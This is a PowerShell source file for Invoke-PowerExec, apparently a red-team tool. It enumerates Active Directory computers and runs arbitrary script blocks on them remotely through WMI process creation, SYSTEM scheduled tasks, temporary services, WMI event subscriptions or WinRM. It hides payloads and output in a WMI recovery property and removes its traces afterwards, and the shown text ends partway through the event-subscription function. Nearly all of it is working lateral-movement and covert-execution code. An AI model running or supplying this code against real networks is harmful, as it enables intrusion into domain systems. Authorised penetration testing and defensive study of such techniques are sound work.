#requires -version 3

Function Invoke-PowerExec {
<#
.SYNOPSIS
    Invoke PowerShell commands on remote computers.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-PowerExec runs PowerShell script block on remote computers through various methods.
    Multi-threading part is mostly stolen from PowerView by @harmj0y and @mattifestation.

.PARAMETER ScriptBlock
    Specifies the PowerShell script block to run.

.PARAMETER ComputerList
    Specifies the target hosts, such as specific addresses or network ranges (CIDR).

.PARAMETER ComputerDomain
    Specifies an Active Directory domain for enumerating target computers.

.PARAMETER ComputerFilter
    Specifies a specific role for enumerating target controllers, defaults to 'All'.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Method
    Specifies the execution method to use, defaults to CimProcess.

.PARAMETER Protocol
    Specifies the transport protocol to use, defaults to DCOM.

.PARAMETER Threads
    Specifies the number of threads to use, defaults to 1.

.EXAMPLE
    PS C:\> Invoke-PowerExec -ScriptBlock {Write-Output "$Env:COMPUTERNAME ($Env:USERDOMAIN\$Env:USERNAME)"} -ComputerList $(gc hosts.txt) -Method CimProcess

.EXAMPLE
    PS C:\> New-PowerLoader -FilePath .\script.ps1 | Invoke-PowerExec -ComputerDomain ADATUM.CORP -Credential ADATUM\Administrator -Method WinRM -Threads 10
#>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ComputerList,

        [ValidateNotNullOrEmpty()]
        [string]
        $ComputerDomain = $Env:LOGONSERVER,

        [ValidateSet('All', 'DomainControllers', 'Servers', 'Workstations')]
        [String]
        $ComputerFilter = 'All',

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
        [String]
        $Method = 'CimProcess',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [ValidateNotNullOrEmpty()]
        [Int]
        $Threads = 1
    )

    if ($Method -eq 'WinRM' -and $PSBoundParameters.ContainsKey('Protocol')) {
        Write-Warning 'Specified protocol will be ignored with method WinRM.'
    }

    $hostList = New-Object Collections.ArrayList

    foreach ($computer in $ComputerList) {
        if ($computer.contains("/")) {
            $hostList.AddRange($(New-IPv4RangeFromCIDR -CIDR $computer))
        }
        else {
            $hostList.Add($computer) | Out-Null
        }
    }

    if ($PSBoundParameters['ComputerDomain'] -or $PSBoundParameters['ComputerFilter']) {
        switch ($ComputerFilter) {
            'All' {
                $filter = '(&(objectCategory=computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))'
            }
            'DomainControllers' {
                $filter = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            }
            'Servers' {
                $filter = '(&(objectCategory=computer)(operatingSystem=*server*)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=8192))'
            }
            'Workstations' {
                $filter = '(&(objectCategory=computer)(!operatingSystem=*server*)(!userAccountControl:1.2.840.113556.1.4.803:=2))'
            }
        }
        $searchString = "LDAP://$ComputerDomain/RootDSE"
        $domainObject = New-Object DirectoryServices.DirectoryEntry($searchString, $null, $null)
        $defaultNC = $domainObject.defaultNamingContext[0]
        $adsPath = "LDAP://$ComputerDomain/$defaultNC"
        $computers = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties 'dnshostname' -Credential $Credential
        foreach ($computer in $computers) {
            if ($computer.dnshostname) {
                $hostList.Add($($computer.dnshostname).ToString()) | Out-Null
            }
        }
    }

    if ($Threads -eq 1 -or $hostList.Count -eq 1) {
        foreach ($computer in $hostList) {
            New-PowerExec -ScriptBlock $ScriptBlock -ComputerName $computer -Credential $Credential -Method $Method -Protocol $Protocol
        }
    }
    else {
        $parameters = @{
            ScriptBlock = $ScriptBlock
            Credential = $Credential
            Method = $Method
            Protocol = $Protocol
            Verbose = $VerbosePreference
        }
        New-ThreadedFunction -ScriptBlock ${function:New-PowerExec} -ScriptParameters $parameters -Collection $hostList -CollectionParameter 'ComputerName' -Threads $Threads
    }
}

# Adapted from Find-Fruit by @rvrsh3ll
Function Local:New-IPv4RangeFromCIDR {
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CIDR
    )

    $hostList = New-Object Collections.ArrayList
    $netPart = $CIDR.split("/")[0]
    [uint32]$maskPart = $CIDR.split("/")[1]

    $address = [Net.IPAddress]::Parse($netPart)
    if ($maskPart -ge $address.GetAddressBytes().Length * 8) {
        throw "Bad host mask"
    }

    $numhosts = [Math]::Pow(2, (($address.GetAddressBytes().Length * 8) - $maskPart))

    $startaddress = $address.GetAddressBytes()
    [array]::Reverse($startaddress)

    $startaddress = [BitConverter]::ToUInt32($startaddress, 0)
    [uint32]$startMask = ([Math]::Pow(2, $maskPart) - 1) * ([Math]::Pow(2, (32 - $maskPart)))
    $startAddress = $startAddress -band $startMask
    # In powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary
    $startAddress = [BitConverter]::GetBytes($startaddress)[0..3]
    [array]::Reverse($startaddress)
    $address = [Net.IPAddress][byte[]]$startAddress

    for ($i = 0; $i -lt $numhosts - 2; $i++) {
        $nextAddress = $address.GetAddressBytes()
        [array]::Reverse($nextAddress)
        $nextAddress = [BitConverter]::ToUInt32($nextAddress, 0)
        $nextAddress++
        $nextAddress = [BitConverter]::GetBytes($nextAddress)[0..3]
        [array]::Reverse($nextAddress)
        $address = [Net.IPAddress][byte[]]$nextAddress
        $hostList.Add($address.IPAddressToString) | Out-Null
    }
    return $hostList
}

Function Local:Get-LdapObject {
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ADSpath,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=*)',

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    if ($Credential.UserName) {
        $domainObject = New-Object DirectoryServices.DirectoryEntry($ADSpath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $searcher = New-Object DirectoryServices.DirectorySearcher($domainObject)
    }
    else {
        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
    }
    $searcher.SearchScope = $SearchScope
    $searcher.PageSize = $PageSize
    $searcher.CacheResults = $false
    $searcher.filter = $Filter
    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
    try {
        $results = $searcher.FindAll()
        $results | Where-Object {$_} | ForEach-Object {
            $objectProperties = @{}
            $p = $_.Properties
            $p.PropertyNames | ForEach-Object {
                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
        $results.dispose()
        $searcher.dispose()
    }
    catch {
        Write-Error $_ -ErrorAction Stop
    }
}

# Adapted from PowerView by @harmj0y and @mattifestation
Function Local:New-ThreadedFunction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $Collection,

        [ValidateNotNullOrEmpty()]
        [String]
        $CollectionParameter = 'ComputerName',

        [Parameter(Mandatory = $True)]
        [ScriptBlock]
        $ScriptBlock,

        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 10,

        [Switch]
        $NoImports
    )

    BEGIN {
        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # Force a single-threaded apartment state (for token-impersonation stuffz)
        $SessionState.ApartmentState = [Threading.ApartmentState]::STA

        # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
        if (-not $NoImports) {
            # Grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # These variables are added by Runspace.Open() method and produce Stop errors if added twice
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # Add variables from Parent Scope (current runspace) into the InitialSessionState
            foreach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                    $SessionState.Variables.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # Add functions from current runspace to the InitialSessionState
            foreach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # Create a pool of $Threads runspaces
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # Get the proper BeginInvoke() method that allows for an output queue
        $Method = $null
        foreach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $Collection = $Collection | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[THREAD] Processing $($Collection.Count) elements with $Threads threads."

        foreach ($Element in $Collection) {
            # Create a "powershell pipeline runner"
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # Add the script block and arguments
            $null = $PowerShell.AddScript($ScriptBlock).AddParameter($CollectionParameter, $Element)
            if ($ScriptParameters) {
                foreach ($Param in $ScriptParameters.GetEnumerator()) {
                    $null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # Create the output queue
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # Start job
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[THREAD] Executing threads"

        # Continuously loop through each job queue, consuming output as appropriate
        do {
            foreach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        while (($Jobs | Where-Object {-not $_.Result.IsCompleted}).Count -gt 0)

        $SleepSeconds = 100
        Write-Verbose "[THREAD] Waiting $SleepSeconds seconds for final cleanup..."

        # Cleanup
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            foreach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -Seconds 1
        }

        $Pool.Dispose()
        Write-Verbose "[THREAD] All threads completed"
    }
}

Function Local:New-PowerExec {
    Param (
        [Parameter(Mandatory = $True)]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('CimProcess', 'CimTask', 'CimService', 'CimSubscription', 'SmbService', 'WinRM')]
        [String]
        $Method = 'CimProcess',

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    $output = $null
    switch ($Method) {
        'WinRM' {
            try {
                $output = Invoke-Command -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -ErrorAction Stop
            }
            catch [Management.Automation.RuntimeException] {
                if($Error[0].FullyQualifiedErrorId -eq 'ComputerNotFound,PSSessionStateBroken') {
                    Write-Verbose "[$ComputerName] DNS resolution failed."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'WinRMOperationTimeout,PSSessionStateBroken') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'CannotConnect,PSSessionStateBroken') {
                    Write-Verbose "[$ComputerName] WinRM server is unavailable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'AccessDenied,PSSessionStateBroken') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
        'CimProcess' {
            try {
                $output = Invoke-CimProcess -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Protocol $Protocol -Verbose:$false
            }
            catch [Microsoft.Management.Infrastructure.CimException] {
                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
        'CimTask' {
            try {
                $output = Invoke-CimTask -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Protocol $Protocol -Verbose:$false
            }
            catch [Microsoft.Management.Infrastructure.CimException] {
                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
        'CimService' {
            try {
                $output = Invoke-CimService -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Protocol $Protocol -Verbose:$false
            }
            catch [Microsoft.Management.Infrastructure.CimException] {
                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
        'CimSubscription' {
            try {
                $output = Invoke-CimSubscription -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Protocol $Protocol -Verbose:$false
            }
            catch [Microsoft.Management.Infrastructure.CimException] {
                if($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x800706ba,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x8007052e,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                elseif($Error[0].FullyQualifiedErrorId -eq 'HRESULT 0x80070005,Microsoft.Management.Infrastructure.CimCmdlets.NewCimSessionCommand') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
        'SmbService' {
            try {
                $output = Invoke-SmbService -ScriptBlock $ScriptBlock -ComputerName $ComputerName -Credential $Credential -Verbose:$false
            }
            catch [Management.Automation.RuntimeException] {
                if ($Error[0].FullyQualifiedErrorId -eq '5') {
                    Write-Verbose "[$ComputerName] Access is denied."
                }
                elseif ($Error[0].FullyQualifiedErrorId -eq '1722') {
                    Write-Verbose "[$ComputerName] Host is unreachable."
                }
                else {
                    Write-Warning "[$ComputerName] Execution failed. $_"
                }
            }
        }
    }
    if ($output) {
        Write-Host "[$ComputerName] Successful execution"
        Write-Output $output
    }
}

Function Local:Invoke-CimDelivery {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock
    )

    BEGIN {
        Write-Verbose "[CIMDELIVERY] Getting CIM object"
        $cimObject = Get-CimInstance -Class Win32_OSRecoveryConfiguration -CimSession $CimSession -ErrorAction Stop -Verbose:$false
        $obj = New-Object -TypeName psobject
        $obj | Add-Member -MemberType NoteProperty -Name 'OriginalValue' -Value $cimObject.DebugFilePath
    }
    PROCESS {
        Write-Verbose "[CIMDELIVERY] Encoding payload into CIM property DebugFilePath"
        $script = ''
        $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
        $script += '$output = [Management.Automation.PSSerializer]::Serialize((& $scriptBlock *>&1))' + [Environment]::NewLine
        $script += '$encOutput = [Int[]][Char[]]$output -Join '',''' + [Environment]::NewLine
        $script += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration' + [Environment]::NewLine
        $script += '$x.DebugFilePath = $encOutput' + [Environment]::NewLine
        $script += '$x.Put()'
        $encScript = [Int[]][Char[]]$script -Join ','
        $cimObject.DebugFilePath = $encScript
        $cimObject | Set-CimInstance -Verbose:$false
        $obj | Add-Member -MemberType NoteProperty -Name 'TamperedValue' -Value $cimObject.DebugFilePath
    }
    END {
        $loader = ''
        $loader += '$x = Get-WmiObject -Class Win32_OSRecoveryConfiguration; '
        $loader += '$y = [char[]][int[]]$x.DebugFilePath.Split('','') -Join ''''; '
        $loader += '$z = [ScriptBlock]::Create($y); '
        $loader += '& $z'
        $obj | Add-Member -MemberType NoteProperty -Name 'Loader' -Value $loader
        return $obj
    }
}

Function Local:Invoke-CimRecovery {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [ValidateNotNullOrEmpty()]
        [String]
        $DefaultValue = '%SystemRoot%\MEMORY.DMP'
    )

    BEGIN {
        Write-Verbose "[CIMRECOVERY] Getting CIM object"
        $cimObject = Get-CimInstance -ClassName Win32_OSRecoveryConfiguration -CimSession $cimSession -Verbose:$false -ErrorAction Stop
        $computerName = $CimSession.ComputerName
    }
    PROCESS {
        try {
            Write-Verbose "[CIMRECOVERY] Decoding data from property DebugFilePath"
            $serializedOutput = [char[]][int[]]$cimObject.DebugFilePath.Split(',') -Join ''
            $output = ([Management.Automation.PSSerializer]::Deserialize($serializedOutput))
        }
        catch [Management.Automation.RuntimeException] {
            Write-Warning "[$computerName] Failed to decode data."
        }
        finally {
            Write-Verbose "[CIMRECOVERY] Restoring original value: $DefaultValue"
            $cimObject.DebugFilePath = $DefaultValue
            $cimObject | Set-CimInstance -Verbose:$false
        }
    }
    END {
        return $output
    }
}

Function Local:Invoke-CimProcess {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        try {
            $cimOption = New-CimSessionOption -Protocol $Protocol
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch {
            throw $_
        }
        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
        $command = 'powershell -NoP -NonI -C "' + $delivery.Loader + '"'
    }
    PROCESS {
        try {
            Write-Verbose "[CIMEXEC] Running command: $command"    
            $process = Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=$command} -CimSession $cimSession -Verbose:$false
            while ((Get-CimInstance -ClassName Win32_Process -Filter "ProcessId='$($process.ProcessId)'" -CimSession $cimSession -Verbose:$false).ProcessID) {
                Start-Sleep -Seconds 1
            }
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            Write-Warning "[$ComputerName] Execution failed. $_"
        }
    }
    END {
        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
        Remove-CimSession -CimSession $cimSession
    }
}

Function Local:Invoke-CimTask {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        try {
            $cimOption = New-CimSessionOption -Protocol $Protocol
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch {
            throw $_
        }
        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
        $argument = '-NoP -NonI -C "' + $delivery.Loader + '"'
    }
    PROCESS {
        try  {
            $taskParameters = @{
                TaskName = [guid]::NewGuid().Guid
                Action = New-ScheduledTaskAction -WorkingDirectory "%windir%\System32\WindowsPowerShell\v1.0\" -Execute "powershell" -Argument $argument
                Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -CimSession $cimSession
            }
            Write-Verbose "[CIMEXEC] Registering scheduled task $($taskParameters.TaskName)"
            $scheduledTask = Register-ScheduledTask @taskParameters -CimSession $cimSession -ErrorAction Stop
            Write-Verbose "[CIMEXEC] Running command: powershell $argument"
            $cimJob = $scheduledTask | Start-ScheduledTask -AsJob -ErrorAction Stop
            $cimJob | Wait-Job | Remove-Job -Force -Confirm:$False
            while (($scheduledTaskInfo = $scheduledTask | Get-ScheduledTaskInfo).LastTaskResult -eq 267009) {
                Start-Sleep -Seconds 1
            }

            if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
                Write-Warning "[$ComputerName] Failed to execute scheduled task."
            }

            Write-Verbose "[CIMEXEC] Unregistering scheduled task $($taskParameters.TaskName)"
            if ($Protocol -eq 'Wsman') {
                $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$False | Out-Null
            }
            else {
                $scheduledTask | Get-ScheduledTask -ErrorAction SilentlyContinue | Unregister-ScheduledTask | Out-Null
            }
        }
        catch [Management.Automation.ActionPreferenceStopException] {
            Write-Warning "[$ComputerName] Insufficient rights."
        }
        catch {
            Write-Warning "[$ComputerName] Execution failed. $_"
        }
    }
    END {
        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
        Remove-CimSession -CimSession $cimSession
    }
}

Function Local:Invoke-CimService {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        try {
            $cimOption = New-CimSessionOption -Protocol $Protocol
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch {
            throw $_
        }
        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
        $command = '%COMSPEC% /c powershell -NoP -NonI -C "' + $delivery.Loader + '"'
        $serviceName = [guid]::NewGuid().Guid
    }
    PROCESS {
        try  {
            Write-Verbose "[CIMEXEC] Creating service $serviceName"
            $result = Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
                StartMode = 'Manual'
                StartName = 'LocalSystem'
                ServiceType = ([Byte] 16)
                ErrorControl = ([Byte] 1)
                Name = $serviceName
                DisplayName = $serviceName
                DesktopInteract  = $false
                PathName = $command
            } -CimSession $cimSession -Verbose:$false

            if ($result.ReturnValue -eq 0) {
                Write-Verbose "[CIMEXEC] Running command: $command"
                $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$serviceName'" -CimSession $cimSession -Verbose:$false
                Invoke-CimMethod -MethodName StartService -InputObject $service -Verbose:$false | Out-Null
                do {
                    Start-Sleep -Seconds 1
                    $service = Get-CimInstance -ClassName Win32_Service -Filter "Name='$serviceName'" -CimSession $cimSession -Verbose:$false
                }
                until ($service.ExitCode -ne 1077 -or $service.State -ne 'Stopped')

                Write-Verbose "[CIMEXEC] Removing service $serviceName"
                Invoke-CimMethod -MethodName Delete -InputObject $service -Verbose:$false | Out-Null
            }
            else {
                Write-Warning "[$ComputerName] Service creation failed ($($result.ReturnValue))."
            }
        }
        catch {
            Write-Warning "[$ComputerName] Execution failed. $_"
        }
    }
    END {
        Invoke-CimRecovery -CimSession $cimSession -DefaultValue $delivery.OriginalValue
        Remove-CimSession -CimSession $cimSession
    }
}

Function Local:Invoke-CimSubscription {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom',

        [Int]
        $Sleep = 60
    )

    BEGIN {
        try {
            $cimOption = New-CimSessionOption -Protocol $Protocol
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch {
            throw $_
        }
        $delivery = Invoke-CimDelivery -CimSession $cimSession -ScriptBlock $ScriptBlock
        $command = 'powershell.exe -NoP -NonI -C "' + $delivery.Loader + '"'
        $filterName = [guid]::NewGuid().Guid
        $consumerName = [guid]::NewGuid().Guid
    }
    PROCESS {
        try  {
            Write-Verbose "[CIMEXEC] Creating event filter $filterName"
            $filterParameters = @{
                EventNamespace = 'root/CIMV2'
                Name = $filterName
                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode='4625'"
                QueryLanguage = 'WQL'
            }
            $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Arguments $filterParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false

            Write-Verbose "[CIMEXEC] Creating event consumer $consumerName"
            $consumerParameters = @{
                Name = $consumerName
                CommandLineTemplate = $command
            }
            $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Arguments $consumerParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false

            Write-Verbose "[CIMEXEC] Creating event to consumer binding"
            $bindingParameters = @{
                Filter = [Ref]$filter
                Consumer = [Ref]$consumer
            }
            $binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Arguments $bindingParameters -CimSession $cimSession -ErrorAction Stop -Verbose:$false

            Write-Verbose "[CIMEXEC] Running command: $command"
